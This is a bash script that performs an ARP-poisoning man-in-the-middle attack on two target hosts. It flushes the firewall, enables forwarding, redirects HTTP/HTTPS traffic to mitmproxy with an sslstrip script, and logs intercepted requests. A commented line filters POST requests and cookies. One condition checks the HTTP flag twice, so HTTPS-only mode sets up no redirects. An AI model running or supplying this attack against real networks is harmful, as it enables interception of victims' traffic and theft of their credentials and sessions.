#! /bin/bash

INTERACTIVE_MODE=0
HTTP_INTERCEPTION=0
HTTPS_INTERCEPTION=0
#####################################
# Displays help
#####################################
function help(){
	echo "Usage: $0 [-i] [-n] [-s] ip_target1 ip_target2"
	echo "       [-i] interactive mode for mitmproxy"
	echo "       [-n] capture HTTP traffic"
	echo "       [-s] capture HTTPS traffic"
        exit 1
}

#####################################
# Checking is root
#####################################
if [ $(id -u) -ne 0 ]; then
    echo "You'd better be root! Exiting..."
    exit
fi

if [ $# -lt 2 ] || [ $# -gt 5 ]; then
    help
fi

#getting options -ins
while getopts ":ins" OPT; do
    case $OPT in
        i)
            INTERACTIVE_MODE=1
            ;;
        n)
            HTTP_INTERCEPTION=1
            ;;
        s)
            HTTPS_INTERCEPTION=1
            ;;

        :)
            echo "Invalid option $OPT"
            help
            ;;
    esac
done

shift $(($OPTIND - 1))
TARGET1=$1
TARGET2=$2

if [ ${HTTP_INTERCEPTION} -eq 1 ] || [ ${HTTP_INTERCEPTION} -eq 1 ]; then
	echo "Flushing iptables..."
	#####################################
	# flushing routing configuration
	#####################################
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	echo "Setting configuration..."
	#####################################
	# routing configuration
	#####################################
	sysctl -w net.ipv4.ip_forward=1

	#avoid icmp redirect
	echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects

        #iptables redirect from 80 to 8080 on localhost
        if [ ${HTTP_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
	fi

 	#iptables redirect from 443 to 8080 on localhost
        if [ ${HTTPS_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
	fi
fi

arpoison ${TARGET1} ${TARGET2}

#####################################
# mitmproxy
#####################################
if [ ${INTERACTIVE_MODE} -eq 1 ]; then
	xterm -maximized -T "mitmproxy" -hold -e mitmproxy -T --anticache --host --anticomp --noapp --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py --eventlog &
else
	echo "Running mitmdump..."
	mitmdump -T --anticache --host --anticomp --noapp --quiet --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py
	#mitmdump -T --anticache --host --anticomp --noapp --quiet --script ./sslstrip.py -a requests.log "~m POST | (~m GET & ~hq Cookie)"      
fi
